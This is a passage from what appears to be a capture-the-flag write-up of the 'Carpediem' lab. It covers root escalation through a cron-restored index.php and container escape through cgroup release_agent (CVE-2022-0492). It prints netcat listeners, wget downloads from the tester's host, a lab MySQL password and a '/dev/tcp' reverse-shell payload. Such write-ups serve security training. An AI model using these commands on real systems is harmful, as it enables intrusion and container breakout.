+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er">(</span><span class="ex">http://0.0.0.0:80/</span><span class="kw">)</span> <span class="ex">...</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.167</span> <span class="at">-</span> <span class="at">-</span> [14/Sep/2022 09:03:27] <span class="st">"GET /rev.sh HTTP/1.1"</span> 200 </span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem nc <span class="at">-lvnp</span> 4488</span>
+<span id="cb35-8"><a href="#cb35-8" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
+<span id="cb35-9"><a href="#cb35-9" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.10</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.167]</span> 58916</span>
+<span id="cb35-10"><a href="#cb35-10" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> cannot set terminal process group <span class="er">(</span><span class="ex">271</span><span class="kw">)</span><span class="bu">:</span> Inappropriate ioctl for device</span>
+<span id="cb35-11"><a href="#cb35-11" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> no job control in this shell</span>
+<span id="cb35-12"><a href="#cb35-12" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$</span> </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-3-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
+<p>Before uploading <code>deepce.sh</code> lets have a look around if we find anything sensitive.</p>
+<p>New MySQL credentials:</p>
+<div class="sourceCode" id="cb36"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/var/www/html/backdrop$</span> cat settings.php</span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="va">$database</span> = <span class="st">'mysql://backdrop:34tB8RGtgtJjZ2Tz@localhost/backdrop'</span><span class="kw">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>A script owned by root that we have execute privileges over:</p>
+<div class="sourceCode" id="cb37"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/opt$</span> ls <span class="at">-al</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 12</span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 1 root root 4096 Jun 23 09:50 .</span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 1 root root 4096 Sep 14 01:10 ..</span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span> 1 root root  510 Jun 23 09:49 heartbeat.sh</span>
+<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/opt$</span> cat heartbeat.sh</span>
+<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
+<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a><span class="co">#Run a site availability check every 10 seconds via cron</span></span>
+<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a><span class="va">checksum</span><span class="op">=</span><span class="va">($(</span><span class="ex">/usr/bin/md5sum</span> /var/www/html/backdrop/core/scripts/backdrop.sh<span class="va">))</span></span>
+<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">[[</span> <span class="va">$checksum</span> <span class="ot">!=</span> <span class="st">"70a121c0202a33567101e2330c069b34"</span> <span class="kw">]];</span> <span class="cf">then</span></span>
+<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a>    <span class="bu">exit</span></span>
+<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a><span class="cf">fi</span></span>
+<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a><span class="va">status</span><span class="op">=</span><span class="va">$(</span><span class="ex">php</span> /var/www/html/backdrop/core/scripts/backdrop.sh <span class="at">--root</span> /var/www/html/backdrop https://localhost<span class="va">)</span></span>
+<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="st">"Welcome to backdrop.carpediem.htb!"</span> <span class="st">"</span><span class="va">$status</span><span class="st">"</span></span>
+<span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">[[</span> <span class="st">"</span><span class="va">$?</span><span class="st">"</span> <span class="ot">!=</span> 0 <span class="kw">]];</span> <span class="cf">then</span></span>
+<span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a>    <span class="co">#something went wrong.  restoring from backup.</span></span>
+<span id="cb37-18"><a href="#cb37-18" aria-hidden="true" tabindex="-1"></a>    <span class="fu">cp</span> /root/index.php /var/www/html/backdrop/index.php</span>
+<span id="cb37-19"><a href="#cb37-19" aria-hidden="true" tabindex="-1"></a><span class="cf">fi</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The comments in the scripts do a good job explaining what it does, every few seconds it will run the script to make sure that <code>backdrop.carpediem.htb</code> is alive and running. If something is wrong, it will copy a backup of <code>index.php</code> from <code>/root</code>, to restore the site.</p>
+<p>We can confirm if this script is executed by <code>root</code> or <code>www-data</code> using <code>pspy64</code>:</p>
+<div class="sourceCode" id="cb38"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/dev/shm$</span> wget http://10.10.14.10/pspy64</span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/dev/shm$</span> chmod +x pspy64</span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/dev/shm$</span> cp pspy64 /tmp</span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/dev/shm$</span> /tmp/pspy64</span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/09/14</span> 01:25:17 CMD: UID=0    PID=54872  <span class="kw">|</span> <span class="ex">/bin/bash</span> /opt/heartbeat.sh</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>It’s ran as root. We should be able to get a revere shell as root then by simply replacing index.php with a reverse shell..</p>
+<div class="sourceCode" id="cb39"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@90c7f522b842:/dev/shm$</span> cp rev.php /var/www/html/backdrop/index.php</span>
+<span id="cb39-2"><a href="#cb39-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-3"><a href="#cb39-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem nc <span class="at">-lvnp</span> 4499                              </span>
+<span id="cb39-4"><a href="#cb39-4" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4499 ...</span>
+<span id="cb39-5"><a href="#cb39-5" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.10</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.167]</span> 41614</span>
+<span id="cb39-6"><a href="#cb39-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Linux</span> 90c7f522b842 5.4.0-97-generic <span class="co">#110-Ubuntu SMP Thu Jan 13 18:22:13 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span>
+<span id="cb39-7"><a href="#cb39-7" aria-hidden="true" tabindex="-1"></a> <span class="ex">01:30:16</span> up 1 day, 23:13,  0 users,  load average: 0.03, 0.09, 0.08</span>
+<span id="cb39-8"><a href="#cb39-8" aria-hidden="true" tabindex="-1"></a><span class="ex">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
+<span id="cb39-9"><a href="#cb39-9" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
+<span id="cb39-10"><a href="#cb39-10" aria-hidden="true" tabindex="-1"></a><span class="ex">/bin/sh:</span> 0: cant access tty<span class="kw">;</span> <span class="ex">job</span> control turned off</span>
+<span id="cb39-11"><a href="#cb39-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb39-12"><a href="#cb39-12" aria-hidden="true" tabindex="-1"></a><span class="co"># id &amp;&amp; hostname</span></span>
+<span id="cb39-13"><a href="#cb39-13" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
+<span id="cb39-14"><a href="#cb39-14" aria-hidden="true" tabindex="-1"></a><span class="ex">90c7f522b842</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-4-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-4-1">Step 4</h3>
+<p>Trying to escape this container we can upload <code>deepce.sh</code> to get some quick information:</p>
+<div class="sourceCode" id="cb40"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="co"># wget http://10.10.14.10/deepce.sh</span></span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="co"># chmod +x deepce.sh</span></span>
+<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a><span class="co"># bash deepce.sh</span></span>
+<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Dangerous Capabilities .. Yes</span>
+<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Current:</span> cap_dac_override</span>
+<span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Bounding</span> set =cap_dac_override</span>
+<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Current</span> IAB: !cap_dac_read_search,!cap_sys_module,!cap_sys_ptrace,!cap_sys_admin</span>
+<span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Privileged Mode ......... Unknown</span>
+<span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Docker sock mounted ....... No</span>
+<span id="cb40-12"><a href="#cb40-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Other mounts .............. No</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>To verify if we’re in a privileged mode or not, we can simply <code>ls -al /dev</code>, if privileged all devices should be accessible and we can escape by mounting the host disk. If not privileged only a limited amount of devices are shown.</p>
+<div class="sourceCode" id="cb41"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="co"># ls -al /dev   </span></span>
+<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 4</span>
+<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 5 root root    360 Sep 12 02:16 .</span>
+<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 1 root root   4096 Sep 14 02:15 ..</span>
+<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a><span class="ex">crw--w----</span> 1 root tty  136, 0 Sep 12 02:16 console</span>
+<span id="cb41-6"><a href="#cb41-6" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwxrwxrwx</span> 1 root root     11 Sep 12 02:16 core <span class="at">-</span><span class="op">&gt;</span> /proc/kcore</span>
+<span id="cb41-7"><a href="#cb41-7" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwxrwxrwx</span> 1 root root     13 Sep 12 02:16 fd <span class="at">-</span><span class="op">&gt;</span> /proc/self/fd</span>
+<span id="cb41-8"><a href="#cb41-8" aria-hidden="true" tabindex="-1"></a><span class="ex">crw-rw-rw-</span> 1 root root   1, 7 Sep 12 02:16 full</span>
+<span id="cb41-9"><a href="#cb41-9" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxrwt</span> 2 root root     40 Sep 12 02:16 mqueue</span>
+<span id="cb41-10"><a href="#cb41-10" aria-hidden="true" tabindex="-1"></a><span class="ex">crw-rw-rw-</span> 1 root root   1, 3 Sep 12 02:16 null</span>
+<span id="cb41-11"><a href="#cb41-11" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwxrwxrwx</span> 1 root root      8 Sep 12 02:16 ptmx <span class="at">-</span><span class="op">&gt;</span> pts/ptmx</span>
+<span id="cb41-12"><a href="#cb41-12" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 2 root root      0 Sep 12 02:16 pts</span>
+<span id="cb41-13"><a href="#cb41-13" aria-hidden="true" tabindex="-1"></a><span class="ex">crw-rw-rw-</span> 1 root root   1, 8 Sep 12 02:16 random</span>
+<span id="cb41-14"><a href="#cb41-14" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxrwt</span> 3 root root    120 Sep 14 01:46 shm</span>
+<span id="cb41-15"><a href="#cb41-15" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwxrwxrwx</span> 1 root root     15 Sep 12 02:16 stderr <span class="at">-</span><span class="op">&gt;</span> /proc/self/fd/2</span>
+<span id="cb41-16"><a href="#cb41-16" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwxrwxrwx</span> 1 root root     15 Sep 12 02:16 stdin <span class="at">-</span><span class="op">&gt;</span> /proc/self/fd/0</span>
+<span id="cb41-17"><a href="#cb41-17" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwxrwxrwx</span> 1 root root     15 Sep 12 02:16 stdout <span class="at">-</span><span class="op">&gt;</span> /proc/self/fd/1</span>
+<span id="cb41-18"><a href="#cb41-18" aria-hidden="true" tabindex="-1"></a><span class="ex">crw-rw-rw-</span> 1 root root   5, 0 Sep 12 02:16 tty</span>
+<span id="cb41-19"><a href="#cb41-19" aria-hidden="true" tabindex="-1"></a><span class="ex">crw-rw-rw-</span> 1 root root   1, 9 Sep 12 02:16 urandom</span>
+<span id="cb41-20"><a href="#cb41-20" aria-hidden="true" tabindex="-1"></a><span class="ex">crw-rw-rw-</span> 1 root root   1, 5 Sep 12 02:16 zero</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We’re missing a lot of devices, so we’re not privileged.</p>
+<p>Looking on the capabilities, we only have <code>dac_override</code> that stands out, this allows us to write to any file, something that is expected when <code>root</code> so we can skip this.</p>
+<p>Googling around for further escapes I come across <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf">this PDF</a> from blackhat where <code>release_agent</code> escape is mentioned on page 57. I’ve never heard of this before, and looking on the commands we can see we’ll not be able to run it as we’re not allowed to use <code>mount</code>:</p>
+<p><img src="images/carpediem22.png" class="img-fluid"></p>
+<div class="sourceCode" id="cb42"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="co"># mount -t cgroup -o rdma cgroup /tmp/esc</span></span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="ex">mount:</span> /tmp/esc: permission denied.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Running <code>linpeas.sh</code> confirms that this should be a breakout vector, so maybe I need to dig a bit deeper.</p>
+<div class="sourceCode" id="cb43"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="co"># wget http://10.10.14.10/linpeas.sh</span></span>
+<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a><span class="co"># chmod +x linpeas.sh</span></span>
+<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a><span class="co"># bash linpeas.sh </span></span>
+<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-5"><a href="#cb43-5" aria-hidden="true" tabindex="-1"></a><span class="ex">══╣</span> Breakout via mounts</span>
+<span id="cb43-6"><a href="#cb43-6" aria-hidden="true" tabindex="-1"></a><span class="ex">╚</span> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts</span>
+<span id="cb43-7"><a href="#cb43-7" aria-hidden="true" tabindex="-1"></a><span class="ex">═╣</span> release_agent breakout 1........ Yes</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Steal the script from HackTricks, upload it and run doesn’t work either..</p>
+<div class="sourceCode" id="cb44"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  carpediem cat esc.sh </span>
+<span id="cb44-2"><a href="#cb44-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Finds + enables a cgroup release_agent</span></span>
+<span id="cb44-3"><a href="#cb44-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Looks for something like: /sys/fs/cgroup/*/release_agent</span></span>
+<span id="cb44-4"><a href="#cb44-4" aria-hidden="true" tabindex="-1"></a><span class="va">d</span><span class="op">=</span><span class="kw">`</span><span class="fu">dirname</span> <span class="va">$(</span><span class="fu">ls</span> <span class="at">-x</span> /s<span class="pp">*</span>/fs/c<span class="pp">*</span>/<span class="pp">*</span>/r<span class="pp">*</span> <span class="kw">|</span><span class="fu">head</span> <span class="at">-n1</span><span class="va">)</span><span class="kw">`</span></span>
+<span id="cb44-5"><a href="#cb44-5" aria-hidden="true" tabindex="-1"></a><span class="co"># If "d" is empty, this won't work, you need to use the next PoC</span></span>
+<span id="cb44-6"><a href="#cb44-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-7"><a href="#cb44-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Enables notify_on_release in the cgroup</span></span>
+<span id="cb44-8"><a href="#cb44-8" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> <span class="va">$d</span>/w<span class="kw">;</span></span>
+<span id="cb44-9"><a href="#cb44-9" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> 1 <span class="op">&gt;</span><span class="va">$d</span>/w/notify_on_release</span>
+<span id="cb44-10"><a href="#cb44-10" aria-hidden="true" tabindex="-1"></a><span class="co"># If you have a "Read-only file system" error, you need to use the next PoC</span></span>
+<span id="cb44-11"><a href="#cb44-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-12"><a href="#cb44-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Finds path of OverlayFS mount for container</span></span>
+<span id="cb44-13"><a href="#cb44-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Unless the configuration explicitly exposes the mount point of the host filesystem</span></span>
+<span id="cb44-14"><a href="#cb44-14" aria-hidden="true" tabindex="-1"></a><span class="co"># see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html</span></span>
+<span id="cb44-15"><a href="#cb44-15" aria-hidden="true" tabindex="-1"></a><span class="va">t</span><span class="op">=</span><span class="kw">`</span><span class="fu">sed</span> <span class="at">-n</span> <span class="st">'s/overlay \/ .*\perdir=\([^,]*\).*/\1/p'</span> /etc/mtab<span class="kw">`</span></span>
+<span id="cb44-16"><a href="#cb44-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-17"><a href="#cb44-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Sets release_agent to /path/payload</span></span>
+<span id="cb44-18"><a href="#cb44-18" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> /o<span class="kw">;</span> <span class="bu">echo</span> <span class="va">$t</span>/c <span class="op">&gt;</span> <span class="va">$d</span>/release_agent</span>
+<span id="cb44-19"><a href="#cb44-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-20"><a href="#cb44-20" aria-hidden="true" tabindex="-1"></a><span class="co"># Creates a payload</span></span>
+<span id="cb44-21"><a href="#cb44-21" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"#!/bin/sh"</span> <span class="op">&gt;</span> /c</span>
+<span id="cb44-22"><a href="#cb44-22" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"ps &gt; </span><span class="va">$t</span><span class="st">/o"</span> <span class="op">&gt;&gt;</span> /c</span>
+<span id="cb44-23"><a href="#cb44-23" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /c</span>
+<span id="cb44-24"><a href="#cb44-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-25"><a href="#cb44-25" aria-hidden="true" tabindex="-1"></a><span class="co"># Triggers the cgroup via empty cgroup.procs</span></span>
+<span id="cb44-26"><a href="#cb44-26" aria-hidden="true" tabindex="-1"></a><span class="fu">sh</span> <span class="at">-c</span> <span class="st">"echo 0 &gt; </span><span class="va">$d</span><span class="st">/w/cgroup.procs"</span><span class="kw">;</span> <span class="fu">sleep</span> 1</span>
+<span id="cb44-27"><a href="#cb44-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-28"><a href="#cb44-28" aria-hidden="true" tabindex="-1"></a><span class="co"># Reads the output</span></span>
+<span id="cb44-29"><a href="#cb44-29" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /o</span>
+<span id="cb44-30"><a href="#cb44-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-31"><a href="#cb44-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb44-32"><a href="#cb44-32" aria-hidden="true" tabindex="-1"></a><span class="co"># wget http://10.10.14.10/esc.sh</span></span>
+<span id="cb44-33"><a href="#cb44-33" aria-hidden="true" tabindex="-1"></a><span class="co"># chmod +x esc.sh</span></span>
+<span id="cb44-34"><a href="#cb44-34" aria-hidden="true" tabindex="-1"></a><span class="co"># bash esc.sh</span></span>
+<span id="cb44-35"><a href="#cb44-35" aria-hidden="true" tabindex="-1"></a><span class="ex">mkdir:</span> cannot create directory <span class="st">'/sys/fs/cgroup/rdma/w'</span>: Read-only file system</span>
+<span id="cb44-36"><a href="#cb44-36" aria-hidden="true" tabindex="-1"></a><span class="ex">esc.sh:</span> line 11: /sys/fs/cgroup/rdma/w/notify_on_release: No such file or directory</span>
+<span id="cb44-37"><a href="#cb44-37" aria-hidden="true" tabindex="-1"></a><span class="ex">esc.sh:</span> line 20: /sys/fs/cgroup/rdma/release_agent: Read-only file system</span>
+<span id="cb44-38"><a href="#cb44-38" aria-hidden="true" tabindex="-1"></a><span class="ex">sh:</span> 1: cannot create /sys/fs/cgroup/rdma/w/cgroup.procs: Directory nonexistent</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>After a bit more investigating I come across <a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492">this post</a> about CVE-2022-0492 explaining how we can create new user namespace and cgroup namespace using <code>unshare -UrmC bash</code>, and then be able to mount the cgroupfs.</p>
+<blockquote class="blockquote">
+<p><em>“.. in the container we execute unshare to create new user namespace and cgroup namespace. Then we can mount the cgroupfs and write our data to release_agent.”</em></p>
+</blockquote>
+<p>So lets jump back to the first escape from Blackhat, this time using <code>unshare</code> to create new namespaces.</p>
+<div class="sourceCode" id="cb45"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="co"># wget http://10.10.14.10/esc.sh</span></span>
+<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a><span class="co"># chmod +x esc.sh</span></span>
+<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a><span class="co"># cat esc.sh</span></span>
+<span id="cb45-4"><a href="#cb45-4" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /tmp/esc</span>
+<span id="cb45-5"><a href="#cb45-5" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="at">-t</span> cgroup <span class="at">-o</span> rdma cgroup /tmp/esc</span>
+<span id="cb45-6"><a href="#cb45-6" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /tmp/esc/w</span>
+<span id="cb45-7"><a href="#cb45-7" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> 1 <span class="op">&gt;</span> /tmp/esc/w/notify_on_release</span>
+<span id="cb45-8"><a href="#cb45-8" aria-hidden="true" tabindex="-1"></a><span class="va">pop</span><span class="op">=</span><span class="st">"</span><span class="va">$overlay</span><span class="st">/shell.sh"</span></span>
+<span id="cb45-9"><a href="#cb45-9" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"bash -i &gt;&amp; /dev/tcp/10.10.14.10/4400 0&gt;&amp;1"</span> <span class="op">&gt;</span> /shell.sh</span>
+<span id="cb45-10"><a href="#cb45-10" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /shell.sh</span>
+<span id="cb45-11"><a href="#cb45-11" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="va">$pop</span> <span class="op">&gt;</span> /tmp/esc/release_agent</span>
+<span id="cb45-12"><a href="#cb45-12" aria-hidden="true" tabindex="-1"></a><span class="fu">sleep</span> 5 <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="dv">0</span><span class="op">&gt;</span>/tmp/esc/w/cgroup.procs <span class="kw">&amp;</span></span>
+<span id="cb45-13"><a href="#cb45-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb45-14"><a href="#cb45-14" aria-hidden="true" tabindex="-1"></a><span class="co"># unshare -UrmC bash</span></span>
+<span id="cb45-15"><a href="#cb45-15" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> esc.sh</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Nothing happens.. I really don’t understand the <code>$overlay</code> part, echoing it returns nothing. Investigating this further we find another, very similar, <a href="https://blog.aquasec.com/threat-alert-container-escape">PoC</a>: <img src="images/carpediem23.png" class="img-fluid"></p>
+<p>With some trial-and-error I got the escape working, for me the issue was my payload - so make sure to test it before incorporating it to a exploit.</p>
+<div class="sourceCode" id="cb46"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="co"># unshare -UrmC bash</span></span>
+<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> http://10.10.14.10/esc.sh</span>
+<span id="cb46-3"><a href="#cb46-3" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x esc.sh</span>
+<span id="cb46-4"><a href="#cb46-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb46-5"><a href="#cb46-5" aria-hidden="true" tabindex="-1"></a></span>
